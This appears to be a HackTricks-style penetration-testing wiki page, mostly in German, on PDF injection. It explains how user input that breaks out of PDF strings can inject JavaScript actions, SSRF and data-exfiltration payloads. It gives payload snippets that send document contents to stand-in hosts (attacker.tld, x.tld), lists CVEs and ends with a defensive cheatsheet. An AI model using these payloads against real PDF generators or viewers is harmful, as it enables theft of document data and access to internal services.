# PDF Injection

{{#include ../../banners/hacktricks-training.md}}

**Wenn deine Eingabe in einer PDF-Datei reflektiert wird, kannst du versuchen, PDF-Daten einzuschleusen, um JavaScript auszuführen, SSRF durchzuführen oder den PDF-Inhalt zu stehlen.**
PDF syntax ist extrem permissiv – wenn du aus dem string oder dictionary, das deine Eingabe einbettet, ausbrechen kannst, kannst du komplett neue objects (oder neue keys im selben object) anhängen, die Acrobat/Chrome problemlos parsen.
Seit 2024 hat eine Welle von bug-bounty-Reports gezeigt, dass *one unescaped parenthesis or back-slash is enough* für die vollständige Ausführung von Skripten.

## TL;DR – Moderner Angriffsablauf (2024-2026)
1. Finde einen beliebigen user-controlled Wert, der im generierten PDF innerhalb eines **(parenthesis string)**, `/URI ( … )` oder `/JS ( … )` Feldes landet.
2. Injiziere `) ` (schließt den string), gefolgt von einem der untenstehenden primitives, und beende mit einer weiteren öffnenden Klammer, damit die Syntax gültig bleibt.
3. Liefere das bösartige PDF an ein Opfer (oder an einen Backend-Service, der die Datei automatisch rendert – ideal für blind bugs).
4. Dein payload läuft im PDF-Viewer:
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js (see CVE-2024-4367)
* Acrobat → Full JavaScript API (can exfiltrate arbitrary file contents with `this.getPageNthWord`)

Example (annotation link hijack):
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*Die erste `)` schließt die ursprüngliche URI-Zeichenkette, anschließend fügen wir ein neues **Action**-Dictionary hinzu, das Acrobat ausführt, wenn Sie auf den Link klicken.*

## Nützliche Injection-Primitives
| Ziel | Payload Snippet | Anmerkungen |
|------|-----------------|-------|
| **JavaScript on open** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Wird sofort ausgeführt, wenn das Dokument geöffnet wird (funktioniert in Acrobat, nicht in Chrome). |
| **JavaScript on link** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | Funktioniert in PDFium & Acrobat, wenn Sie eine `/Link`-Annotation kontrollieren. |
| **Blind data exfiltration** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | Kombinieren Sie dies mit `this.getPageNthWord` in JS, um Inhalte zu stehlen. |
| **Server-Side SSRF** | Same as above but target an internal URL – great when the PDF is rendered by back-office services that honour `/URI`. | Wie oben, aber zielen Sie auf eine interne URL – nützlich, wenn das PDF von Back-Office-Services gerendert wird, die `/URI` respektieren. |
| **Additional Actions (/AA)** | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | An ein Page-/Annotation-/Form-Dictionary anhängen, um beim Öffnen/Fokus ausgeführt zu werden. |
| **Line Break for new objects** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | Wenn die Library das Einfügen von Newline-Zeichen erlaubt, können Sie komplett neue Objekte erstellen. |

## Embedded Actions as Injection Targets
PDF-Viewer behandeln **embedded actions** wie `/OpenAction` und `/AA` (Additional Actions) als erstklassige Funktionen, die beim Öffnen eines Dokuments oder beim Auftreten eines bestimmten Events ausgeführt werden können. Wenn Sie in ein Dictionary injizieren können, das Actions akzeptiert (Catalog, Page, Annotation oder Form field), können Sie einen `/AA`-Baum einhängen und JavaScript beim Öffnen/Fokus auslösen.

Example payload for **generator-side object injection** (close the original string/dictionary and inject `/AA`):
```pdf
) >> /AA << /O << /S /JavaScript /JS (app.alert('AA fired')) >> >> (
```
Dieses Muster entspricht kürzlichen jsPDF-Problemen, bei denen angreiferkontrollierte Eingaben, die an `addJS` (oder bestimmte AcroForm-Felder) übergeben werden, aus dem vorgesehenen JavaScript-String ausbrechen und ein **Additional Action** dictionary injiziert.

## Blind Enumeration Trick
Gareth Heyes (PortSwigger) veröffentlichte einen Einzeiler, der jedes Objekt in einem unbekannten Dokument auflistet – praktisch, wenn Sie das erzeugte PDF nicht sehen können:
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
Der Code iteriert über das Acrobat DOM und macht ausgehende Anfragen für jedes Property/Value-Paar, wodurch ein *JSON-ish* Dump der Datei entsteht.
Siehe das White-paper “Portable Data **ex**Filtration” für die vollständige Technik.

## Real-World Bugs (2023-2026)
* **CVE-2026-25755** – jsPDF `addJS` PDF object injection: vom Angreifer kontrollierte Strings können das JS-Literal schließen und `/AA` → `/O` → `/JavaScript` Aktionen injizieren, die beim Öffnen/Fokus ausgelöst werden.
* **CVE-2024-4367** – Arbitrary JavaScript execution in Firefox’s PDF.js prior to 4.2.67 umging die Sandbox mit einer manipulierten `/JavaScript`-Action.
* **Bug bounty 2024-05** – Ein großes Fintech erlaubte kundengesteuerte Invoice Notes, die in `/URI` landeten; der Report wurde mit $10k vergütet, nachdem ein SSRF zum internen Metadata-Host mittels `file:///` URI demonstriert wurde.
* **CVE-2023-26155** – `node-qpdf` command-injection via unsanitised PDF path zeigt, wie wichtig es ist, Backslashes und Klammern zu escapen, sogar *before* der PDF-Ebene.

## Defensive Cheatsheet
1. **Niemals rohe Benutzereingaben konkatenieren** innerhalb von `(`…`)` Strings oder Namen. Escape `\`, `(`, `)` wie von §7.3 der PDF-Spezifikation verlangt oder verwende Hex-Strings `<...>`.
2. Wenn du Links baust, bevorzuge `/URI (https://…)`, die du *vollständig* URL-enkodierst; blockiere `javascript:`-Schemata in Client-Viewern.
3. Entferne oder validiere `/OpenAction`, `/AA` (additional actions), `/Launch`, `/SubmitForm` und `/ImportData` Dictionaries beim Post-Processing von PDFs.
4. Auf der Serverseite rendere untrusted PDFs mit einem *headless converter* (z. B. qpdf –decrypt –linearize), der JavaScript und externe Aktionen entfernt.
5. Halte PDF-Viewer aktuell; PDF.js < 4.2.67 und Acrobat Reader vor den Patches von July 2024 erlauben triviale Codeausführung.
6. Wenn du client-side Generatoren verwendest (z. B. jsPDF), übergib niemals untrusted Input an `addJS` oder AcroForm-Setter, die in PDF-Action-Dictionaries landen.

## References
* Gareth Heyes, “Portable Data exFiltration – XSS for PDFs”, PortSwigger Research (updated May 2024). <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (Apr 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
* GitLab Advisory Database, “CVE-2026-25755: jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method” (Feb 2026). <https://advisories.gitlab.com/pkg/npm/jspdf/CVE-2026-25755/>
* Adobe Acrobat Help, “Acrobat shows a warning message when signing documents” (Sep 2025) – embedded actions like OpenAction/AA. <https://helpx.adobe.com/acrobat/kb/embedded-action-signing-warning.html>
{{#include ../../banners/hacktricks-training.md}}
